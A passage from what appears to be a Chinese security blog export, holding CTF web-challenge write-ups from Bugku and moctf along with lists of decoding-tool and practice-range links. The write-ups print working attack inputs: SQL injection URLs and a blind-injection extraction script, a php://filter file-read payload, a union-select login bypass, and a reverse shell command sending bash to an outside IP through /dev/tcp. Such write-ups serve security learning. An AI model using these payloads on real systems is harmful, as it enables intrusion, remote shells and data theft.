class="string">'Qianye'</span>]);</span><br></pre></td></tr></table></figure></p><p>还是不成功<br>用大佬的一句话，绕过成功。<br>得到flag文件，并得到upload.php源码,果然是过滤了&lt;?php ?&gt;<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$_FILES</span>[<span class="string">"file"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = array(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    @<span class="variable">$temp</span> = explode(<span class="string">"."</span>, <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> (((@<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>) || (@<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">    || (@<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>) || (@<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">    || (@<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>) || (@<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">    &amp;&amp; (@<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; 102400) &amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$filename</span> = date(<span class="string">'Ymdhis'</span>).rand(1000, 9999).<span class="string">'.'</span>.<span class="variable">$extension</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . <span class="variable">$filename</span>))&#123;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">"upload/"</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$content</span> = preg_replace(<span class="string">'/&lt;\?php|\?&gt;/i'</span>, <span class="string">'_'</span>, <span class="variable">$content</span>);</span><br><span class="line">        file_put_contents(<span class="string">'upload/'</span>.<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"file upload successful!Save in:  "</span> . <span class="string">"upload/"</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"upload failed!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"upload failed! allow only jpg,png,gif,jpep"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h1 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h1><p>一个假的登入框，根据提示输入?hint=1，发现源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include_once(<span class="string">"flag.php"</span>); </span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">'ISecer'</span>]; </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'hint'</span>]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize(<span class="variable">$cookie</span>) === <span class="string">"<span class="variable">$KEY</span>"</span>) </span><br><span class="line">&#123;    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$flag</span>"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">'ISecer:www.isecer.com'</span>; </span><br><span class="line">?&gt;1</span><br></pre></td></tr></table></figure></p><p>Cookie的反序列化</p><h1 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h1><p><a href="http://www.lijiejie.com/ds_store_exp_ds_store_file_disclosure_exploit" target="_blank" rel="noopener">.DS_Store文件泄露</a></p><h1 id="孙XX的博客"><a href="#孙XX的博客" class="headerlink" title="孙XX的博客"></a>孙XX的博客</h1><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=93&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">12中报错语句</a><br><br><a href="http://blog.csdn.net/wuqiongrj/article/details/51995016" target="_blank" rel="noopener">sql注入的详细总结</a><br>空格被过滤可以使用”%09   %0A   %0C   %0D    %0B”替代<br>过滤了很多，尝试用反引号报错,只能读取30个，字符，改变substr()中的后两个值，多次，拼接成完整的字符Flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://103.238.227.13:10088/index.php?id=1%0aand%0aextractvalue(1,concat(0x7e,(select%0aconcat(0x7e,substr((load_file(0x2F7661722F746573742F6B65795F312E706870)),86,146),0x7e)),0x7e))</span><br></pre></td></tr></table></figure></p><h1 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h1><h1 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h1><p><a href="http://www.bugku.com/thread-80-1-1.html" target="_blank" rel="noopener">一个大佬的思路</a><br><br>union select md5()的姿势，尝试下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username=a<span class="string">' union select 1,md5(1)-- -&amp;password=1</span></span><br></pre></td></tr></table></figure></p><p>登入成功。出现进程监控系统</p><p>过滤了一些东西，导致不能回显，考虑端口反弹<br><br>在外网主机上监听<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br></pre></td></tr></table></figure></p><p>在网站上输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/23.106.128.52/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>之后就可以查看文件，得到flag的文件内容了</p><h1 id="login3"><a href="#login3" class="headerlink" title="login3"></a>login3</h1><h1 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h1>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文章和笔记资料</title>
      <link href="/posts/a8ea2937.html"/>
      <url>/posts/a8ea2937.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>把一些别人的笔记和文章，整理一下，方便以后查找。<br><a id="more"></a><br><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="noopener">Web-Security-Learning文章整理</a><br><br><a href="http://www.mottoin.com/99834.html" target="_blank" rel="noopener">有趣的二进制读书笔记</a><br><br><a href="https://github.com/myh0st/scripts" target="_blank" rel="noopener">思维脑图</a><br><br><a href="https://github.com/JnuSimba/MiscSecNotes" target="_blank" rel="noopener">详细的web知识笔记</a><br><br><a href="https://github.com/JnuSimba/AndroidSecNotes" target="_blank" rel="noopener">Android 安全</a><br><br><a href="https://github.com/tengzhangchao/Sec-Box" target="_blank" rel="noopener">内网渗透整理和工具的使用</a><br><br><a href="https://github.com/LisonFan/china_ip_list" target="_blank" rel="noopener">中国ip地址列表</a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br></p>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Online decryption</title>
      <link href="/posts/797044d1.html"/>
      <url>/posts/797044d1.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一些在线的密码解密，整理一下，省得自己以后重复的去找，方便自己。</p><a id="more"></a><p><a href="http://www.jsons.cn/idcard/350583199611106/" target="_blank" rel="noopener">在线工具导航</a><br><a href="http://web2hack.org/xssee" target="_blank" rel="noopener">xssee</a><br><br><a href="http://encode.chahuo.com" target="_blank" rel="noopener">在线加密解密</a><br><br><a href="http://bianma.911cha.com" target="_blank" rel="noopener">在线编码解码</a><br><br><a href="http://www.bejson.com/convert/unicode_chinese" target="_blank" rel="noopener">Unicode转中文</a><br><br><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">Quoted-Printable</a><br><br><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">ROT5/13/18/47编码转换</a><br><br><a href="http://www.qqxiuzi.cn/bianma/base.php?type=16" target="_blank" rel="noopener">base16</a><br><br><a href="https://tools.deamwork.com/crypt/decrypt/base32decode.html" target="_blank" rel="noopener">base32</a><br><br><a href="http://coolaf.com/tool/imgtob" target="_blank" rel="noopener">base64 转图片在线解码编码</a><br><br><a href="http://base64.xpcha.com/" target="_blank" rel="noopener">base64编码和图片编码</a><br><br><a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">quipqiup古典密码自动化爆破(词频分析)</a><br><br><a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">摩斯密码翻译器</a><br><br><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">摩尔斯电码转换器</a><br><br><a href="">字符串编码，解码，转换(长度,大小写,反转,进制转换)</a><br><br><a href="http://packetlife.net/toolbox/type7" target="_blank" rel="noopener">Cisco Type 7 Reverser</a><br><br><a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">Cisco</a><br><br><a href="https://tool.lu/js/" target="_blank" rel="noopener">js代码在线加密解密</a><br><br><a href="http://www.dheart.net/decode/index.php" target="_blank" rel="noopener">JScript/VBscript脚本解密</a><br><br><a href="http://adophper.com/encode.html" target="_blank" rel="noopener">VBScript.Encode解密</a><br><br><a href="">JScript.Encode脚本加密与解密</a><br><br><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">uuencode解码 &amp;&amp; xxencode解码(古老的邮件密码)</a><br><br><a href="http://dogmamix.com/MimeHeadersDecoder/" target="_blank" rel="noopener">MIME标准(邮件编码的一种)</a><br><br><a href="">Binhex编码(邮件编码的一种,常见于MAC机)</a><br><br><a href="http://web.chacuo.net/charsetescape" target="_blank" rel="noopener">%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee)</a><br><br><a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="noopener">猪圈密码</a><br><br><a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="noopener">ppencode(把Perl代码转换成只有英文字母的字符串)</a><br><br><a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密</a><br><br><a href="http://tmxk.org/jother/" target="_blank" rel="noopener">jother</a><br><br><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">Vigenère维多利亚解密</a><br><br><a href="http://planetcalc.com/2468/" target="_blank" rel="noopener">Vigenère cipher</a><br><br><a href="http://planetcalc.com/3327/" target="_blank" rel="noopener">Hill cipher(希尔密码)</a><br><br><a href="http://planetcalc.com/4647/" target="_blank" rel="noopener">Atbash cipher(埃特巴什码)</a><br><br><a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="noopener">snow(html隐写)</a><br><br><a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">十六进制Hex转文本字符串</a><br><br><a href="http://www.convertstring.com/EncodeDecode/HexDecode" target="_blank" rel="noopener">Hex2text</a><br></p><p><a href="http://www.atool.org/file_hash.php" target="_blank" rel="noopener">文件在线Hash</a><br><br><a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">分解素数(ESA)</a><br><br><a href="http://www.kloth.net/services/cardpunch.php" target="_blank" rel="noopener">Punch Card</a><br><br><a href="http://www.atool.org" target="_blank" rel="noopener">atool(杂乱)</a><br><br><a href="http://www.bejson.com" target="_blank" rel="noopener">bejson(杂乱)</a><br><br><a href="http://zh.bloggif.com/gif-extract" target="_blank" rel="noopener">在线分解GIF帧图</a><br><br><a href="http://jiema.wwei.cn/" target="_blank" rel="noopener">在线二维码解密</a><br><br><a href="http://www.wwei.cn/" target="_blank" rel="noopener">生成二维码</a><br><br><a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">二维码/条形码</a><br><br><a href="http://www.aies.cn" target="_blank" rel="noopener">在线繁体字转换器</a><br><br><a href="http://tomeko.net/online_tools/" target="_blank" rel="noopener">在线工具集合</a><br><br><a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">文本加密为汉字(“盲文”，音符，各种语言，花朵，箭头…)</a><br><br><a href="http://rumkin.com/tools/cipher/" target="_blank" rel="noopener">集合（各种古典密码)</a><br><br><a href="http://www.qqxiuzi.cn/daohang.htm" target="_blank" rel="noopener">集合</a><br></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> 密码学 </category>
          
          <category> 在线工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 密码学 </tag>
            
            <tag> 在线工具 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一些靶场</title>
      <link href="/posts/2c81768d.html"/>
      <url>/posts/2c81768d.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一些靶场收集<br><a id="more"></a><br><a href="https://github.com/We5ter/Awesome-Platforms" target="_blank" rel="noopener"> 一个真棒平台，包括CTF /安全响应中心/错误跟踪等源码搭建。</a><br><br><a href="https://github.com/leveryd/vulndocker" target="_blank" rel="noopener">漏洞靶场平台源码</a><br><br><a href="https://sourceforge.net/projects/bwapp/" target="_blank" rel="noopener">Bwapp</a><br><br><a href="http://www.webug.org/" target="_blank" rel="noopener">webbug靶场</a><br><br><a href="">xvwa靶场</a> 链接: <a href="https://pan.baidu.com/s/1cUdURs" target="_blank" rel="noopener">https://pan.baidu.com/s/1cUdURs</a> 密码: qbku<br><br><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">zvuldrill靶场</a><br><br><a href="https://www.vulnhub.com/entry/lab26-1,190/#download" target="_blank" rel="noopener">包含多个漏洞演示程序的虚拟机镜像</a><br><br><a href="https://github.com/phith0n/vulhub" target="_blank" rel="noopener">vulhub</a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br><br><a href=""></a><br></p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>moctf平台的web题</title>
      <link href="/posts/593de28d.html"/>
      <url>/posts/593de28d.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="http://www.moctf.com/home" target="_blank" rel="noopener">moctf平台</a> 学长们搭建的平台，挺不错的。<br><a id="more"></a></p><h1 id="限制访问"><a href="#限制访问" class="headerlink" title="限制访问"></a>限制访问</h1><p>提示值允许只允许使用NAIVE浏览器访问！通过bp抓包，修改UA为NAIVE。又显示只能允许香港记者访问，修改AL为zh-HK.</p><h1 id="机器蛇"><a href="#机器蛇" class="headerlink" title="机器蛇"></a>机器蛇</h1><p>访问robots.txt 访问不允许访问的页面，即可得到flag。</p><h1 id="PHP黑魔法"><a href="#PHP黑魔法" class="headerlink" title="PHP黑魔法"></a>PHP黑魔法</h1><p>源码泄漏php~<br>进入index.php~,得到源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">"moctf&#123;**************&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'a'</span>])&amp;&amp;isset(<span class="variable">$_GET</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$b</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;center&gt;Wrong Answer!&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>)==md5(<span class="variable">$b</span>)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;center&gt;"</span>.<span class="variable">$flag</span>.<span class="string">"&lt;/center&gt;"</span>; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"By:daoyuan"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"&lt;center&gt;Wrong Answer!&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"&lt;center&gt;好像少了点什么&lt;/center&gt;"</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>因为0e[0-9]+格式的字符串在进行弱类型比较时会按照科学计数法后比较<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(!1793422703!,32) = 0e332932043729729062996282883873</span><br><span class="line">md5(QNKCDZO,32) = 0e830400451993494058024219903391</span><br><span class="line">md5(240610708,32) = 0e462097431906509019562988736854</span><br></pre></td></tr></table></figure></p><h1 id="我想要钱"><a href="#我想要钱" class="headerlink" title="我想要钱"></a>我想要钱</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include <span class="string">"flag.php"</span>;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'money'</span>])) &#123;</span><br><span class="line">        <span class="variable">$money</span>=<span class="variable">$_GET</span>[<span class="string">'money'</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$money</span>)&lt;=4&amp;&amp;<span class="variable">$money</span>&gt;time()&amp;&amp;!is_array(<span class="variable">$money</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;!--By:daoyuan--&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"Wrong Answer!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"Wrong Answer!"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>用科学计数法 money=3e10绕过</p><h1 id="听说要登入"><a href="#听说要登入" class="headerlink" title="听说要登入"></a>听说要登入</h1><p>万能密码绕过</p><h1 id="flag在哪里"><a href="#flag在哪里" class="headerlink" title="flag在哪里"></a>flag在哪里</h1><p>访问flag.php发生多次跳转<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag.php -&gt; where_is_flag.php -&gt; I_have_a_flag.php -&gt; I_have_a_frog.php -&gt; no_flag.php</span><br></pre></td></tr></table></figure></p><p>根据提示搜索ppap歌词，<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PPAP</span><br><span class="line">I have a pen,I have an apple.</span><br><span class="line">(Eh~)Apple-pen!</span><br></pre></td></tr></table></figure></p><p>根据歌词，猜测flag的文件为，flagfrog.php</p><h1 id="死亡退出"><a href="#死亡退出" class="headerlink" title="死亡退出"></a>死亡退出</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  <span class="variable">$c</span>=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br><span class="line">  @<span class="variable">$c</span>.=<span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">  @<span class="variable">$filename</span>=<span class="variable">$_POST</span>[<span class="string">'file'</span>]; </span><br><span class="line">  <span class="keyword">if</span>(!isset(<span class="variable">$filename</span>))                    </span><br><span class="line">  &#123;                                       </span><br><span class="line">    file_put_contents(<span class="string">'tmp.php'</span>, <span class="string">''</span>); </span><br><span class="line">  &#125;                                 </span><br><span class="line">  @file_put_contents(<span class="variable">$filename</span>, <span class="variable">$c</span>);</span><br><span class="line">  include(<span class="string">'tmp.php'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题不懂，<a href="http://skysec.top/2018/01/31/moctf-Web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">附上其他大佬的见解吧</a></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>访问如下链接即可得到flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://119.23.73.3:5001/web8/index.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><h1 id="美味的饼干"><a href="#美味的饼干" class="headerlink" title="美味的饼干"></a>美味的饼干</h1><p>cookie中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU=</span><br></pre></td></tr></table></figure></p><p>解码得<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure></p><p>注意到是32wei,md5解密的<br><code>user</code><br>提示要用<code>admin</code>登入，对admin进行MD5机密，再base64，修改cookie可得</p><h1 id="火眼金晶"><a href="#火眼金晶" class="headerlink" title="火眼金晶"></a>火眼金晶</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">"http://119.23.73.3:5001/web10/index.php"</span></span><br><span class="line">r = requests.get(url=url)</span><br><span class="line">res_tr = r<span class="string">"'100'&gt;(.*?)&lt;/textarea&gt;"</span></span><br><span class="line">txt =  re.findall(res_tr,r.content.decode(<span class="string">'utf-8'</span>))[0]</span><br><span class="line">moctf = r<span class="string">"moctf"</span></span><br><span class="line">mount = re.findall(moctf,txt)</span><br><span class="line">number = len(mount)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"answer"</span>:number</span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">"http://119.23.73.3:5001/web10/work.php"</span></span><br><span class="line">s = requests.post(url=url1,data=data,cookies=r.cookies)</span><br><span class="line"><span class="built_in">print</span>(s.content)</span><br></pre></td></tr></table></figure><h1 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h1><p>不会做<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import codecs</span><br><span class="line">s=string.printable</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment"># url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(group_concat(TABLE_NAME))from(information_schema.TABLES)where(TABLE_SCHEMA=database())),"+str(i)+",1))="+j+")"</span></span><br><span class="line">        <span class="comment"># url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(group_concat(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='do_y0u_l1ke_long_t4ble_name')),"+str(i)+",1))="+j+")"</span></span><br><span class="line">        url = <span class="string">"http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),"</span>+str(i)+<span class="string">",1))="</span>+j+<span class="string">")"</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Tip"</span> <span class="keyword">in</span> r.content.decode(<span class="string">'utf-8'</span>):</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p><h1 id="没时间解释"><a href="#没时间解释" class="headerlink" title="没时间解释"></a>没时间解释</h1><p>这是一个条件竞争题。访问，index.php跳转到index2.php 。bp抓包，访问index.php,知道要访问uploadsomething.php. 是一个类似上传的页面，随便上传一个，得知flag在哪个位置，访问之，显示too low. 多次尝试，知道flag在固定的目录下，文件名是我们控制的。开两个intruder.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://119.23.73.3:5006/web2/uploadsomething.php?filename=123&amp;content=§1234§</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://119.23.73.3:5006/web2/uploads/7dab88dbd2950685ac8841eb87e6d68f4ef8c1dd/123</span><br></pre></td></tr></table></figure><h1 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h1><p>题目<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="keyword">function</span> waf(<span class="variable">$a</span>)&#123;</span><br><span class="line">foreach(<span class="variable">$a</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) as <span class="variable">$__R</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="variable">$__R</span>) &#123; </span><br><span class="line">        foreach($<span class="variable">$__R</span> as <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(isset($<span class="variable">$__k</span>) &amp;&amp; $<span class="variable">$__k</span> == <span class="variable">$__v</span>) <span class="built_in">unset</span>($<span class="variable">$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; waf(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; waf(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; waf(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) extract(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) extract(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="variable">$_GET</span>[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$_GET</span>[<span class="string">'flag'</span>] ) == md5(<span class="variable">$_GET</span>[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        include(<span class="variable">$_GET</span>[<span 